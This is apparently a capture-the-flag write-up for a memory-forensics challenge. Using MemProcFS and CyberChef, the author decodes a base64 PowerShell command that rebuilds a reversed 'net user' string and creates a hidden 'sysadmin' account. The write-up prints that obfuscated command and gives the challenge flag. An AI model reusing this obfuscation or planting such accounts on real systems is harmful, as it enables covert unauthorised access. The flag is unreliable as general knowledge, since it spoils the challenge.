this challenge you required to do memory dump analysis, therefore you need to use software like Volatility or Memprocfs

![image](https://github.com/user-attachments/assets/5ee3aa9b-0007-4cdd-80ca-d3d9dd1a7fa4)

analysing it using memprocfs `memprocfs.exe -device C:\Users\aan\Downloads\memory\Windows.vmem -forensic 1`

![image](https://github.com/user-attachments/assets/d721002c-cbce-4de1-8325-f35806bbf9ce)

based from the question itself we were required to find out the created user account and its password, therefore this kind info can be located at forensic/csv/process.csv file, to analyze it even easier you can use spreadsheet software like TimeLineExplorer

![image](https://github.com/user-attachments/assets/cf0db34c-be69-4d78-b4d9-6d1c03a4a8d7)

as you can see, there is a strange powershell base64 encoded command executed

![image](https://github.com/user-attachments/assets/d54d6229-963c-4801-a10b-1a701a742d51)

decoding it using cyberchef here is what we got

![image](https://github.com/user-attachments/assets/3b1a5fb7-a61c-4952-a5a3-921547cd199b)

```
$laIIMq = 'dd' + 'a/' + ' ni' + 'mdAS' + 'YS n' + 'i' + 'md' + 'asys ' + 'r' + 'es' + 'u t' + 'en'; $kSmmAiw = -join ($laIIMq.ToCharArray()[-1..-($laIIMq.Length)]); Invoke-Expression $kSmmAiw ; Start-Sleep -Seconds 600
```

upon further inspection `$laIIMq` is reversed net user command of creating a user `sysadmin:SYSAdmin`

flag `ihack24{sysadmin_SYSAdmin}`


